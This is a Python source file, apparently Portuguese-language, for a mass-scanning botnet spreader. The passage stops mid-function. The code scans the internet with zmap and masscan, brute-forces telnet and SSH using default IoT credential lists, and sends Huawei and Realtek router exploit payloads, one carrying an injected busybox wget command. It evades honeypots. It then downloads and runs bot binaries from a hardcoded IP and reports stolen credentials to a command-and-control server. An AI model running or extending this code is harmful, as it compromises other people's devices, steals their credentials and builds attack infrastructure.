import struct
import select
import errno
import os
import sys
import ipaddress
import re
import requests
import socket
import threading
import warnings
import random
import urllib3
import json
import time
import subprocess
from typing import Optional, List, Tuple, Set, Dict
import queue
import hashlib
import base64
import telnetlib
import paramiko
import http.client
from paramiko import SSHClient, AutoAddPolicy, AuthenticationException, SSHException
from concurrent.futures import ThreadPoolExecutor, as_completed

urllib3.disable_warnings()

RESET = "\033[0m"
RED = "\033[31m"
GREEN = "\033[32m"
YELLOW = "\033[33m"
CYAN = "\033[36m"
BLUE = "\033[34m"
MAGENTA = "\033[35m"
WHITE = "\033[37m"

CNC_IP = "172.96.140.62"
CNC_REPORT_PORT = 14037
CNC_BOT_PORT = 14037
SCANNER_THREADS = 400
MAX_CONCURRENT_SCANS = 2000
REQUEST_TIMEOUT = 3
MAX_REPORTS_QUEUE = 10000
ZMAP_RATE = "50000"
ZMAP_THREADS = "400"

warnings.filterwarnings("ignore", message="Unverified HTTPS request")

class ScanResult:
    def __init__(self, scanner_type: str, ip: str, port: int, credentials: Tuple[str, str] = None, success: bool = False, bot_deployed: bool = False, confidence: int = 0):
        self.scanner_type = scanner_type
        self.ip = ip
        self.port = port
        self.credentials = credentials
        self.success = success
        self.bot_deployed = bot_deployed
        self.timestamp = time.time()
        self.scan_id = hashlib.md5(f"{scanner_type}_{ip}_{port}".encode()).hexdigest()[:8]
        self.confidence = confidence
        self.device_type = "unknown"
        self.command_success_rate = 0.0
        self.architecture = "unknown"

class ConnectionManager:
    def __init__(self, max_connections: int = 2000):
        self.max_connections = max_connections
        self.active_connections = 0
        self.connection_lock = threading.Lock()
        self.semaphore = threading.Semaphore(max_connections)
        
    def acquire(self):
        self.semaphore.acquire()
        with self.connection_lock:
            self.active_connections += 1
        return True
            
    def release(self):
        with self.connection_lock:
            if self.active_connections > 0:
                self.active_connections -= 1
        self.semaphore.release()

class ZmapScanner:
    def __init__(self, ports: List[int]):
        self.ports = ports
        self.is_root = os.geteuid() == 0
        
    def scan_network(self, network: str = "0.0.0.0/0", max_targets: int = 1000000) -> Dict[int, List[str]]:
        results = {port: [] for port in self.ports}
        
        if not self.is_root:
            print(RED + "ZMAP requer root!")
            return results
        
        for port in self.ports:
            print(f"{CYAN}[ZMAP] Escaneando porta {port}...")
            
            cmd = [
                "zmap",
                "-p", str(port),
                "-r", ZMAP_RATE,
                "-T", ZMAP_THREADS,
                "-B", "100M",
                "--max-targets", str(max_targets),
                "-o", "-",
                "--quiet"
            ]
            
            if port == 22:
                cmd.extend(["--probe-module", "tcp_synscan"])
            elif port == 23:
                cmd.extend(["--probe-module", "tcp_synscan"])
            
            try:
                process = subprocess.Popen(
                    cmd,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.DEVNULL,
                    text=True
                )
                
                output, _ = process.communicate(timeout=300)
                
                ips = [ip.strip() for ip in output.split('\n') if ip.strip()]
                results[port] = ips
                
                print(f"{GREEN}[ZMAP] Porta {port}: {len(ips)} IPs")
                
            except subprocess.TimeoutExpired:
                process.kill()
                print(RED + f"[ZMAP] Timeout na porta {port}")
            except Exception as e:
                print(RED + f"[ZMAP] Erro porta {port}: {e}")
        
        return results

class ZmapAdvancedScanner:
    def __init__(self, ports: List[int]):
        self.ports = ports
        self.is_root = os.geteuid() == 0
        
    def scan_with_zap(self, max_targets: int = 2000000) -> Dict[int, List[str]]:
        results = {port: [] for port in self.ports}
        
        if not self.is_root:
            print(RED + "ZAP requer root!")
            return results
        
        for port in self.ports:
            print(f"{MAGENTA}[ZAP] Escaneando porta {port} com masscan...")
            
            cmd = [
                "masscan",
                "-p", str(port),
                "--rate", "100000",
                "--wait", "0",
                "-oG", "-",
                "0.0.0.0/0"
            ]
            
            try:
                process = subprocess.Popen(
                    cmd,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.DEVNULL,
                    text=True
                )
                
                output, _ = process.communicate(timeout=600)
                
                ips = []
                for line in output.split('\n'):
                    if "Ports:" in line:
                        parts = line.split()
                        if len(parts) > 3:
                            ip = parts[3]
                            if ip:
                                ips.append(ip)
                
                results[port] = ips[:max_targets]
                
                print(f"{GREEN}[ZAP] Porta {port}: {len(ips)} IPs")
                
            except subprocess.TimeoutExpired:
                process.kill()
                print(RED + f"[ZAP] Timeout na porta {port}")
            except Exception as e:
                print(RED + f"[ZAP] Erro porta {port}: {e}")
        
        return results

class FastPortScanner:
    def __init__(self, ports: List[int]):
        self.ports = ports
        
    def scan_batch(self, ips: List[str], timeout: float = 1.0) -> Dict[int, List[str]]:
        results = {port: [] for port in self.ports}
        
        def scan_port(port: int, ip_list: List[str]):
            open_ips = []
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            
            for ip in ip_list:
                try:
                    if sock.connect_ex((ip, port)) == 0:
                        open_ips.append(ip)
                except:
                    continue
            
            sock.close()
            with threading.Lock():
                results[port] = open_ips
        
        threads = []
        for port in self.ports:
            thread = threading.Thread(target=scan_port, args=(port, ips))
            thread.daemon = True
            thread.start()
            threads.append(thread)
        
        for thread in threads:
            thread.join(timeout=timeout * 2)
        
        return results

class CNCReporter:
    def __init__(self):
        self.cnc_ip = CNC_IP
        self.cnc_port = CNC_REPORT_PORT
        self.lock = threading.Lock()
        self.queue = queue.Queue(maxsize=MAX_REPORTS_QUEUE)
        self.worker_thread = None
        self.running = False
        self.reconnect_delay = 2
        self.cnc_connected = False
        self.total_sent = 0
        self.total_failed = 0
        
    def start(self):
        self.running = True
        self.worker_thread = threading.Thread(target=self._report_worker, daemon=True)
        self.worker_thread.start()
        print(f"{CYAN}[CNC] Reporter iniciado")
        
    def stop(self):
        self.running = False
        if self.worker_thread:
            self.worker_thread.join(timeout=2)
        print(f"{CYAN}[CNC] Reporter parado. Enviados: {self.total_sent}")
    
    def report(self, result: ScanResult) -> bool:
        try:
            if result.confidence < 70:
                return False
                
            if self.queue.full():
                try:
                    self.queue.get_nowait()
                except queue.Empty:
                    pass
            self.queue.put_nowait(result)
            return True
        except:
            return False
    
    def _report_worker(self):
        while self.running:
            try:
                result = self.queue.get(timeout=0.5)
                if not result:
                    self.queue.task_done()
                    continue
                
                # Envía sin esperar handshake
                if self._send_to_cnc(result):
                    self.total_sent += 1
                    if self.total_sent % 5 == 0:
                        print(f"{GREEN}[CNC] {self.total_sent} bots reportados")
                
                self.queue.task_done()
                
            except queue.Empty:
                continue
            except Exception as e:
                time.sleep(1)
    
    def _send_to_cnc(self, result: ScanResult) -> bool:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            
            try:
                sock.connect((self.cnc_ip, self.cnc_port))
            except:
                sock.close()
                return False
            
            # Formato simple: TYPE|IP|PORT|USER|PASS|SCORE
            username = result.credentials[0] if result.credentials else "N/A"
            password = result.credentials[1] if result.credentials else "N/A"
            
            report_data = f"SCAN|{result.scanner_type}|{result.ip}|{result.port}|{username}|{password}|{result.confidence}\n"
            
            sock.sendall(report_data.encode())
            sock.close()
            return True
            
        except:
            return False

class DeviceFingerprinter:
    
    @staticmethod
    def detect_device_type(tn: telnetlib.Telnet) -> str:
        try:
            device_info = ""
            commands = [
                "uname -a",
                "cat /proc/cpuinfo",
                "cat /etc/os-release",
                "cat /proc/version",
                "busybox",
                "dmesg | head -5",
            ]
            
            for cmd in commands:
                tn.write(cmd.encode() + b" 2>/dev/null\r\n")
                time.sleep(0.3)
                output = tn.read_very_eager().decode('ascii', errors='ignore')
                device_info += output
            
            if "OpenWrt" in device_info or "LEDE" in device_info:
                return "router_openwrt"
            elif "DD-WRT" in device_info:
                return "router_ddwrt"
            elif "Tomato" in device_info:
                return "router_tomato"
            elif "ARM" in device_info and "v5te" in device_info:
                return "iot_armv5"
            elif "MIPS" in device_info:
                return "router_mips"
            elif "busybox" in device_info.lower():
                return "embedded_linux"
            elif "Linux" in device_info:
                return "linux_server"
            elif "Android" in device_info:
                return "android_device"
            elif "camera" in device_info.lower() or "DVR" in device_info or "NVR" in device_info:
                return "security_camera"
            elif "Huawei" in device_info or "HG" in device_info:
                return "huawei_router"
            elif "ZTE" in device_info or "Zxhn" in device_info:
                return "zte_router"
            elif "Realtek" in device_info:
                return "realtek_router"
            else:
                return "unknown"
                
        except:
            return "unknown"
    
    @staticmethod
    def detect_architecture(tn: telnetlib.Telnet) -> str:
        try:
            tn.write(b"uname -m\r\n")
            time.sleep(0.5)
            output = tn.read_very_eager().decode('ascii', errors='ignore').lower()
            
            if "x86_64" in output or "amd64" in output:
                return "x86_64"
            elif "i386" in output or "i686" in output:
                return "x86"
            elif "arm" in output:
                if "armv5" in output:
                    return "arm5"
                elif "armv6" in output:
                    return "arm6"
                elif "armv7" in output:
                    return "arm7"
                elif "armv8" in output:
                    return "arm8"
                else:
                    return "arm"
            elif "mips" in output:
                if "mipsel" in output:
                    return "mipsel"
                else:
                    return "mips"
            elif "aarch64" in output:
                return "aarch64"
            else:
                return "unknown"
        except:
            return "unknown"

class BehaviorAnalyzer:
    
    @staticmethod
    def test_invalid_commands(tn: telnetlib.Telnet) -> bool:
        try:
            invalid_cmds = [
                "xjfksljdfkls",
                "0987654321",
                "xyzabc123",
                "notarealcommand",
            ]
            
            responses = []
            for cmd in invalid_cmds:
                tn.write(cmd.encode() + b"\r\n")
                time.sleep(0.2)
                response = tn.read_very_eager().decode('ascii', errors='ignore')
                responses.append(response)
            
            valid_responses = sum(1 for r in responses if len(r.strip()) > 0)
            return valid_responses < 2
        
        except:
            return True
    
    @staticmethod
    def is_honeypot(tn: telnetlib.Telnet) -> bool:
        try:
            honeypot_indicators = [
                "honeypot", "honeyd", "kippo", "cowrie", "dionaea",
                "tpot", "modern honey network", "mhn"
            ]
            
            tn.write(b"uname -a\r\n")
            time.sleep(0.3)
            output = tn.read_very_eager().decode('ascii', errors='ignore').lower()
            
            for indicator in honeypot_indicators:
                if indicator in output:
                    return True
            
            return False
        except:
            return False

class RealtekScanner:
    def __init__(self):
        self.port = 52869
    
    def scan(self, ip: str) -> Optional[ScanResult]:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            
            if sock.connect_ex((ip, self.port)) != 0:
                sock.close()
                return None
            
            payload = (
                "POST /UD/act?1 HTTP/1.1\r\n"
                "Host: {}:{}\r\n"
                "User-Agent: Realtek UPnP SDK\r\n"
                "Content-Length: 324\r\n"
                "SOAPAction: urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping\r\n"
                "\r\n"
                "<?xml version=\"1.0\"?>\n"
                "<s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">\n"
                "<s:Body>\n"
                "<u:AddPortMapping xmlns:u=\"urn:schemas-upnp-org:service:WANIPConnection:1\">\n"
                "<NewRemoteHost></NewRemoteHost>\n"
                "<NewExternalPort>47450</NewExternalPort>\n"
                "<NewProtocol>TCP</NewProtocol>\n"
                "<NewInternalPort>443</NewInternalPort>\n"
                "<NewInternalClient>192.168.1.1</NewInternalClient>\n"
                "<NewEnabled>1</NewEnabled>\n"
                "<NewPortMappingDescription>test</NewPortMappingDescription>\n"
                "<NewLeaseDuration>0</NewLeaseDuration>\n"
                "</u:AddPortMapping>\n"
                "</s:Body>\n"
                "</s:Envelope>"
            ).format(ip, self.port)
            
            sock.sendall(payload.encode())
            response = sock.recv(4096)
            sock.close()
            
            if b"200 OK" in response or b"<u:AddPortMappingResponse>" in response:
                result = ScanResult("REALTEK", ip, self.port, success=True, confidence=85)
                result.device_type = "realtek_router"
                return result
        
        except:
            pass
        
        return None

class HuaweiScanner:
    def __init__(self):
        self.port = 37215
    
    def scan(self, ip: str) -> Optional[ScanResult]:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            
            if sock.connect_ex((ip, self.port)) != 0:
                sock.close()
                return None
            
            payload = (
                "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1\r\n"
                "Host: {}:{}\r\n"
                "User-Agent: HuaweiHomeGateway\r\n"
                "Content-Type: text/xml\r\n"
                "Content-Length: 329\r\n"
                "\r\n"
                "<?xml version=\"1.0\"?>\n"
                "<s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">\n"
                "<s:Body>\n"
                "<u:Upgrade xmlns:u=\"urn:schemas-upnp-org:service:WANPPPConnection:1\">\n"
                "<NewStatusURL>$(busybox wget -g 192.168.1.100 -l /tmp/bot -r /bot.py)</NewStatusURL>\n"
                "<NewDownloadURL>$(echo HUAWEIUPNP)</NewDownloadURL>\n"
                "</u:Upgrade>\n"
                "</s:Body>\n"
                "</s:Envelope>"
            ).format(ip, self.port)
            
            sock.sendall(payload.encode())
            response = sock.recv(4096)
            sock.close()
            
            if b"200 OK" in response or b"<u:UpgradeResponse>" in response:
                result = ScanResult("HUAWEI", ip, self.port, success=True, confidence=80)
                result.device_type = "huawei_router"
                return result
        
        except:
            pass
        
        return None

class CameraScanner:
    COMMON_PORTS = [80, 443, 8080, 554, 37777, 37778, 8000, 81, 82, 83, 84, 85, 86, 87, 88, 89]
    DEFAULT_CREDS = [
        ("admin", "admin"),
        ("admin", "1234"),
        ("admin", "12345"),
        ("admin", "123456"),
        ("admin", ""),
        ("root", "root"),
        ("root", "1234"),
        ("root", "12345"),
        ("user", "user"),
        ("guest", "guest"),
    ]
    
    def scan(self, ip: str) -> Optional[ScanResult]:
        for port in self.COMMON_PORTS:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(3)
                
                if sock.connect_ex((ip, port)) != 0:
                    sock.close()
                    continue
                
                sock.close()
                
                protocol = "https" if port in [443, 8443] else "http"
                url = f"{protocol}://{ip}:{port}"
                
                try:
                    response = requests.get(url, timeout=5, verify=False)
                    
                    camera_indicators = ['camera', 'webcam', 'surveillance', 'dvr', 'nvr', 
                                        'hikvision', 'dahua', 'axis', 'security']
                    
                    content_lower = response.text.lower()
                    server_header = response.headers.get('Server', '').lower()
                    
                    if any(indicator in content_lower for indicator in camera_indicators) or \
                       any(indicator in server_header for indicator in camera_indicators):
                        
                        for username, password in self.DEFAULT_CREDS:
                            try:
                                auth_response = requests.get(url, auth=(username, password), 
                                                           timeout=5, verify=False)
                                if auth_response.status_code == 200:
                                    result = ScanResult("CAMERA", ip, port, (username, password), 
                                                       success=True, confidence=75)
                                    result.device_type = "security_camera"
                                    return result
                            except:
                                continue
                        
                        result = ScanResult("CAMERA_NO_AUTH", ip, port, success=True, confidence=60)
                        result.device_type = "security_camera"
                        return result
                
                except:
                    continue
                    
            except:
                continue
        
        return None

class CredentialTester:
    COMMON_TELNET_CREDS = [
        ("root", ""),
        ("admin", ""),
        ("root", "root"),
        ("admin", "admin"),
        ("root", "1234"),
        ("root", "12345"),
        ("root", "123456"),
        ("root", "password"),
        ("admin", "password"),
        ("root", "admin"),
        ("admin", "1234"),
        ("user", "user"),
        ("guest", "guest"),
        ("root", "default"),
        ("admin", "default"),
        ("root", "xc3511"),
        ("root", "vizxv"),
        ("root", "xmhdipc"),
        ("root", "888888"),
        ("root", "54321"),
        ("ubnt", "ubnt"),
        ("service", "service"),
        ("default", ""),
        ("root", "juantech"),
        ("root", "12345678"),
        ("root", "1111"),
        ("root", "smcadmin"),
        ("root", "admin123"),
        ("root", "password123"),
        ("support", "support"),
        ("root", "7ujMko0vizxv"),
        ("admin", "admin1234"),
        ("root", "Zte521"),
        ("root", "anko"),
        ("guest", "12345"),
        ("admin", "123456"),
        ("root", "1234567890"),
        ("admin", "1234567890"),
        ("root", "toor"),
        ("pi", "raspberry"),
        ("admin", "5up"),
        ("Admin", "admin"),
        ("root", "hi3518"),
        ("root", "jvbzd"),
        ("root", "klv123"),
        ("root", "meinsm"),
        ("supervisor", "supervisor"),
        ("mother", "fucker"),
        ("admin", "9999"),
        ("admin", "111111"),
        ("admin", "1234567890"),
        ("root", "system"),
        ("root", "ikwb"),
        ("root", "dreambox"),
        ("root", "realtek"),
        ("admin", "1111"),
        ("admin", "4321"),
        ("admin", "567890"),
        ("666666", "666666"),
        ("888888", "888888"),
        ("admin", "admin12345"),
        ("pi", "raspberry"),
        ("root", "alpine"),
        ("root", "oelinux123"),
        ("debian", "temppwd"),
        ("guest", ""),
        ("user", ""),
        ("test", ""),
        ("operator", ""),
        ("service", ""),
        ("default", ""),
        ("anonymous", ""),
        ("cusadmin", "highspeed"),
        ("admin", "attadmin"),
        ("telekom", "telekom"),
        ("root", "admin@huawei"),
        ("root", "zte9x15"),
        ("u0_a266", ""),
        ("u0_a266", "admin"),
        ("u0_a266", "password"),
    ]
    
    COMMON_SSH_CREDS = [
        ("root", ""),
        ("admin", ""),
        ("root", "root"),
        ("admin", "admin"),
        ("root", "1234"),
        ("root", "12345"),
        ("root", "123456"),
        ("root", "password"),
        ("admin", "password"),
        ("root", "admin"),
        ("user", "user"),
        ("ubuntu", "ubuntu"),
        ("pi", "raspberry"),
        ("test", "test"),
        ("guest", "guest"),
        ("root", "toor"),
        ("root", "12345678"),
        ("root", "admin123"),
        ("ubnt", "ubnt"),
        ("root", "pass"),
        ("admin", "admin1234"),
        ("support", "support"),
        ("root", "default"),
        ("admin", "default"),
        ("u0_a266", ""),
        ("u0_a266", "admin"),
        ("u0_a266", "password"),
    ]
    
    @staticmethod
    def validate_telnet_session(tn: telnetlib.Telnet, username: str, password: str) -> Tuple[bool, int, float, str, str]:
        try:
            test_commands = [
                ("echo $?", "0"),
                ("whoami", username),
                ("pwd", "/"),
                ("ls /", "bin"),
                ("uname", "Linux"),
            ]
            
            confidence = 50
            passed_tests = 0
            total_commands = len(test_commands)
            
            for cmd, expected in test_commands:
                tn.write(cmd.encode() + b"\r\n")
                time.sleep(0.3)
                response = tn.read_very_eager().decode('ascii', errors='ignore')
                
                if expected in response:
                    passed_tests += 1
                    confidence += 10
            
            success_rate = passed_tests / total_commands
            
            tn.write(b"touch /tmp/.scanner_test 2>/dev/null && echo OK || echo FAIL\r\n")
            time.sleep(0.3)
            write_test = tn.read_very_eager().decode('ascii', errors='ignore')
            
            if "OK" in write_test:
                confidence += 20
                tn.write(b"rm -f /tmp/.scanner_test\r\n")
                time.sleep(0.2)
            
            device_type = DeviceFingerprinter.detect_device_type(tn)
            architecture = DeviceFingerprinter.detect_architecture(tn)
            
            if BehaviorAnalyzer.is_honeypot(tn):
                confidence = 0
            elif not BehaviorAnalyzer.test_invalid_commands(tn):
                confidence -= 30
            
            return passed_tests >= 3, min(confidence, 100), success_rate, device_type, architecture
            
        except:
            return False, 0, 0.0, "unknown", "unknown"
    
    @staticmethod
    def test_telnet_enhanced(ip: str, port: int) -> Tuple[bool, Tuple[str, str], int, float, str, str]:
        for username, password in CredentialTester.COMMON_TELNET_CREDS:
            try:
                tn = telnetlib.Telnet(ip, port, timeout=6)
                time.sleep(0.5)
                
                index, match, text = tn.expect([b'[Ll]ogin:', b'[Uu]sername:', b'#', b'\$', b'>'], timeout=4)
                
                if index in [0, 1]:
                    tn.write(username.encode() + b"\r\n")
                    time.sleep(0.5)
                    tn.expect([b'[Pp]assword:'], timeout=4)
                    tn.write(password.encode() + b"\r\n")
                    time.sleep(1)
                
                tn.write(b"\r\n")
                time.sleep(0.5)
                prompt = tn.read_very_eager().decode('ascii', errors='ignore')
                
                if not any(marker in prompt for marker in ['#', '$', '%', '>', '~']):
                    tn.close()
                    continue
                
                is_valid, confidence, success_rate, device_type, architecture = CredentialTester.validate_telnet_session(tn, username, password)
                
                tn.close()
                
                if is_valid and confidence >= 60:
                    return True, (username, password), confidence, success_rate, device_type, architecture
                    
            except:
                try:
                    tn.close()
                except:
                    pass
                continue
        
        return False, None, 0, 0.0, "unknown", "unknown"
    
    @staticmethod
    def test_ssh_enhanced(ip: str, port: int) -> Tuple[bool, Tuple[str, str], int, float, str]:
        for username, password in CredentialTester.COMMON_SSH_CREDS:
            ssh = None
            try:
                ssh = SSHClient()
                ssh.set_missing_host_key_policy(AutoAddPolicy())
                ssh.connect(
                    ip,
                    port=port,
                    username=username,
                    password=password,
                    timeout=6,
                    banner_timeout=6,
                    auth_timeout=6,
                    look_for_keys=False,
                    allow_agent=False
                )
                
                confidence = 70
                passed_tests = 0
                
                test_commands = [
                    ("id", "uid="),
                    ("uname -a", "Linux"),
                    ("echo READY", "READY"),
                    ("pwd", "/"),
                    ("whoami", username),
                ]
                
                for cmd, expected in test_commands:
                    stdin, stdout, stderr = ssh.exec_command(cmd, timeout=2)
                    output = stdout.read().decode('utf-8', errors='ignore')
                    
                    if expected in output:
                        passed_tests += 1
                        confidence += 5
                
                success_rate = passed_tests / len(test_commands)
                
                architecture = "unknown"
                stdin, stdout, stderr = ssh.exec_command("uname -m", timeout=2)
                arch_output = stdout.read().decode('utf-8', errors='ignore').lower()
                if "x86_64" in arch_output or "amd64" in arch_output:
                    architecture = "x86_64"
                elif "i386" in arch_output or "i686" in arch_output:
                    architecture = "x86"
                elif "arm" in arch_output:
                    architecture = "arm"
                elif "mips" in arch_output:
                    architecture = "mips"
                elif "aarch64" in arch_output:
                    architecture = "aarch64"
                
                ssh.close()
                
                if passed_tests >= 3 and confidence >= 70:
                    return True, (username, password), min(confidence, 100), success_rate, architecture
                    
            except AuthenticationException:
                if ssh:
                    try:
                        ssh.close()
                    except:
                        pass
            except:
                if ssh:
                    try:
                        ssh.close()
                    except:
                        pass
        
        return False, None, 0, 0.0, "unknown"

class SmartScoringSystem:
    
    @staticmethod
    def calculate_comprehensive_score(
        credentials: Tuple[str, str],
        device_type: str,
        success_rate: float,
        port: int,
        architecture: str = "unknown"
    ) -> int:
        
        score = 0
        
        device_scores = {
            "router_openwrt": 30,
            "router_ddwrt": 28,
            "iot_armv5": 25,
            "router_mips": 22,
            "embedded_linux": 20,
            "linux_server": 15,
            "security_camera": 18,
            "huawei_router": 20,
            "realtek_router": 22,
            "android_device": 15,
            "unknown": 10
        }
        score += device_scores.get(device_type, 10)
        
        top_creds = [("root", ""), ("admin", ""), ("root", "root")]
        if credentials in top_creds:
            score += 25
        elif any(cred in credentials[0].lower() for cred in ["root", "admin"]):
            score += 20
        else:
            score += 15
        
        score += int(success_rate * 20)
        
        if port == 23:
            score += 10
        elif port == 22:
            score += 8
        elif port in [80, 443, 8080]:
            score += 5
        
        if architecture != "unknown":
            score += 5
        
        return max(0, min(score, 100))

class BotDeployer:
    BOT_URLS = {
        "default": "http://172.96.140.62:11202/bins/x86",
        "x86_64": "http://172.96.140.62:11202/bins/x86_64",
        "x86": "http://172.96.140.62:11202/bins/x86",
        "arm": "http://172.96.140.62:11202/bins/arm",
        "arm5": "http://172.96.140.62:11202/bins/arm5",
        "arm6": "http://172.96.140.62:11202/bins/arm6",
        "arm7": "http://172.96.140.62:11202/bins/arm7",
        "mips": "http://172.96.140.62:11202/bins/mips",
        "mipsel": "http://172.96.140.62:11202/bins/mipsel",
        "aarch64": "http://172.96.140.62:11202/bins/aarch64"
    }
    
    @staticmethod
    def deploy_telnet(ip: str, port: int, credentials: Tuple[str, str], device_type: str, architecture: str) -> bool:
        try:
            tn = telnetlib.Telnet(ip, port, timeout=10)
            time.sleep(0.3)
            
            tn.write(credentials[0].encode() + b"\r\n")
            time.sleep(0.5)
            tn.write(credentials[1].encode() + b"\r\n")
            time.sleep(1)
            
            tn.write(b"cd /tmp || cd /var/tmp || cd /dev/shm\r\n")
            time.sleep(0.5)
            
            arch_key = architecture if architecture in BotDeployer.BOT_URLS else "default"
            if arch_key == "unknown":
                arch_key = "arm" if "arm" in device_type else "mips" if "mips" in device_type else "default"
            
            bot_url = BotDeployer.BOT_URLS.get(arch_key, BotDeployer.BOT_URLS["default"])
            
            deploy_cmd = f"wget {bot_url} -O .b 2>/dev/null || curl {bot_url} -o .b 2>/dev/null || busybox wget {bot_url} -O .b\r\n"
            tn.write(deploy_cmd.encode())
            time.sleep(2)
            
            tn.write(b"chmod +x .b\r\n")
            time.sleep(0.5)
            
            tn.write(b"./.b >/dev/null 2>&1 &\r\n")
            time.sleep(0.5)
            
            tn.write(b"sleep 1 && ps aux | grep .b | grep -v grep\r\n")
            time.sleep(1)
            
            check = tn.read_very_eager().decode('ascii', errors='ignore')
            tn.close()
            
            return '.b' in check or 'wget' in check or 'curl' in check
            
        except:
            return False
    
    @staticmethod
    def deploy_ssh(ip: str, port: int, credentials: Tuple[str, str], architecture: str) -> bool:
        try:
            ssh = SSHClient()
            ssh.set_missing_host_key_policy(AutoAddPolicy())
            ssh.connect(
                ip,
                port=port,
                username=credentials[0],
                password=credentials[1],
                timeout=10,
                look_for_keys=False,
                allow_agent=False
            )
            
            arch_key = architecture if architecture in BotDeployer.BOT_URLS else "default"
            bot_url = BotDeployer.BOT_URLS.get(arch_key, BotDeployer.BOT_URLS["default"])
            
            deploy_cmd = f"cd /tmp && (wget {bot_url} -O .b 2>/dev/null || curl {bot_url} -o .b 2>/dev/null) && chmod +x .b && nohup ./.b >/dev/null 2>&1 &"
            
            stdin, stdout, stderr = ssh.exec_command(deploy_cmd, timeout=6)
            time.sleep(1)
            
            stdin, stdout, stderr = ssh.exec_command("ps aux | grep .b | grep -v grep", timeout=3)
            check = stdout.read().decode('utf-8', errors='ignore')
            
            ssh.close()
            return '.b' in check
            
        except:
            return False

class TargetExpansion:
    
    @staticmethod
    def get_expanded_ports() -> List[int]:
        return [22, 23, 21, 80, 443, 8080, 2222, 2323, 3389, 5900, 5901, 52869, 37215, 554, 37777]
    
    @staticmethod
    def generate_isp_targets() -> List[str]:
        isp_ranges = [
            ("71.0.0.0", "71.255.255.255"),
            ("96.0.0.0", "96.63.255.255"),
            ("73.0.0.0", "73.255.255.255"),
            ("98.0.0.0", "98.255.255.255"),
            ("12.0.0.0", "12.255.255.255"),
            ("99.0.0.0", "99.255.255.255"),
            ("84.0.0.0", "84.255.255.255"),
            ("78.0.0.0", "78.255.255.255"),
            ("177.0.0.0", "177.255.255.255"),
            ("187.0.0.0", "187.255.255.255"),
            ("46.0.0.0", "46.255.255.255"),
            ("95.0.0.0", "95.255.255.255"),
        ]
        
        targets = []
        for start, end in isp_ranges:
            start_int = int(ipaddress.IPv4Address(start))
            end_int = int(ipaddress.IPv4Address(end))
            
            for _ in range(5000):
                ip_int = random.randint(start_int, end_int)
                ip = str(ipaddress.IPv4Address(ip_int))
                targets.append(ip)
        
        return targets

class OptimizedScanner:
    
    def __init__(self):
        self.batch_size = 200
        self.timeout = 2.0
        self.max_workers = 300
        self.realtek_scanner = RealtekScanner()
        self.huawei_scanner = HuaweiScanner()
        self.camera_scanner = CameraScanner()
    
    def parallel_credential_test(self, targets: List[Tuple[str, int, str]]) -> List[ScanResult]:
        results = []
        
        def process_target(target):
            ip, port, scanner_type = target
            
            if scanner_type == "TELNET":
                success, creds, confidence, success_rate, device_type, architecture = CredentialTester.test_telnet_enhanced(ip, port)
            elif scanner_type == "SSH":
                success, creds, confidence, success_rate, architecture = CredentialTester.test_ssh_enhanced(ip, port)
                device_type = "unknown"
            elif scanner_type == "REALTEK":
                result = self.realtek_scanner.scan(ip)
                if result:
                    return result
                return None
            elif scanner_type == "HUAWEI":
                result = self.huawei_scanner.scan(ip)
                if result:
                    return result
                return None
            elif scanner_type == "CAMERA":
                result = self.camera_scanner.scan(ip)
                if result:
                    return result
                return None
            else:
                return None
            
            if success and confidence >= 60:
                final_score = SmartScoringSystem.calculate_comprehensive_score(
                    creds, device_type, success_rate, port, architecture
                )
                
                if final_score >= 70:
                    result = ScanResult(
                        scanner_type=scanner_type,
                        ip=ip,
                        port=port,
                        credentials=creds,
                        success=True,
                        bot_deployed=False,
                        confidence=final_score
                    )
                    result.device_type = device_type
                    result.command_success_rate = success_rate
                    result.architecture = architecture
                    return result
            
            return None
        
        with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            futures = {executor.submit(process_target, target): target for target in targets}
            
            for future in as_completed(futures):
                try:
                    result = future.result(timeout=8)
                    if result:
                        results.append(result)
                except:
                    continue
        
        return results

class MassScanner:
    def __init__(self):
        self.reporter = CNCReporter()
        self.connection_manager = ConnectionManager(MAX_CONCURRENT_SCANS)
        self.optimized_scanner = OptimizedScanner()
        self.is_root = os.geteuid() == 0
        
        self.stats = {
            'total_ips': 0,
            'open_ports': 0,
            'successful_logins': 0,
            'bots_deployed': 0,
            'real_devices': 0,
            'start_time': time.time()
        }
        self.stats_lock = threading.Lock()
        
        self.running = False
        
    def initialize(self):
        print(GREEN + "=" * 70)
        print(GREEN + "ENHANCED MASS SCANNER v4.0 - MULTI-EXPLOIT")
        print(GREEN + "=" * 70)
        
        if self.is_root:
            print(GREEN + f"[+] ROOT DETECTADO - ZMAP/ZAP ativados")
        else:
            print(YELLOW + "[!] Sem root - Modo rápido")
        
        self.reporter.start()
        
    def zmap_scan_phase(self) -> Dict[int, List[str]]:
        print(GREEN + "\n[FASE 1] Scan ZMAP/ZAP...")
        
        if not self.is_root:
            return {}
        
        if random.choice([True, False]):
            print(CYAN + "[+] Usando ZMAP...")
            scanner = ZmapScanner([22, 23, 80, 443, 52869, 37215])
            results = scanner.scan_network(max_targets=3000000)
        else:
            print(MAGENTA + "[+] Usando ZAP (masscan)...")
            scanner = ZmapAdvancedScanner([22, 23, 80, 443, 52869, 37215])
            results = scanner.scan_with_zap(max_targets=2000000)
        
        total_ips = sum(len(ips) for ips in results.values())
        with self.stats_lock:
            self.stats['total_ips'] = total_ips
        
        print(GREEN + f"[+] Scan rápido: {total_ips} IPs")
        return results
    
    def fast_scan_phase(self) -> Dict[int, List[str]]:
        print(GREEN + "\n[FASE 1] Scan rápido...")
        
        all_ips = []
        
        random_ips = []
        for i in range(10):
            batch = self._generate_random_ips(30000)
